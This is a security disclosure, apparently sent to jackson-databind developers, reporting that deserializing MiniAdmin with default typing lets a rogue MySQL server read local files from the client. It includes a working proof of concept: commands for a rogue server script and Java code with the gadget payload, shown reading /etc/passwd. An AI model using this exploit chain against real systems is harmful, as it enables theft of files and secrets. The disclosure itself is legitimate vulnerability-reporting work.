Hi developers: 

I found jackson-databind is vulnerable to arbitrary local file read. When jackson-databind deserializes a com.mysql.cj.jdbc.admin.MiniAdmin object from json, it allows attackers to read arbitrary local files. Details are as follows:

Brief
1) Method com.mysql.cj.jdbc.admin.MiniAdmin#MiniAdmin(java.lang.String) accepts a jdbcUrl, and it will connect to that mysql server. When jackson deserializes a com.mysql.cj.jdbc.admin.MiniAdmin object from json, it will connect to the mysql server that defined in json, which is a malicious mysql server and can be controlled by attackers.

2) When mysql client connect to a mysql server with MySQL Connector/J before version 8.0.15 released at 2019-02-01, mysql server is able to read arbitrary local file from mysql client. You can refer to this url: http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/

PoC
The malicious mysql server that is able to read arbitrary local file from mysql client is available at https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py . You can custom the port of mysql server ( 3306 default ) and the file that you want to read from mysql client (/etc/passwd default). 
1. starting mysql server:
> python rogue_mysql_server.py
2. tail -f mysql.log in the same directory of rogue_mysql_server.py:
> tail -f mysql.log
3. deserialize a com.mysql.cj.jdbc.admin.MiniAdmin object from json: 
public static void main(String[] args){
    String payload="[\"com.mysql.cj.jdbc.admin.MiniAdmin\",\"jdbc:mysql://localhost:3307/test\"]";

    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    try {
        mapper.readValue(payload, Object.class);
    } catch (IOException e) {
        e.printStackTrace();
    }
}
malicious mysql server received /etc/passwd from mysql client. 

The complete codes are attached.

Original vulnerability discoverer 
618 from College of software, Nankai University.
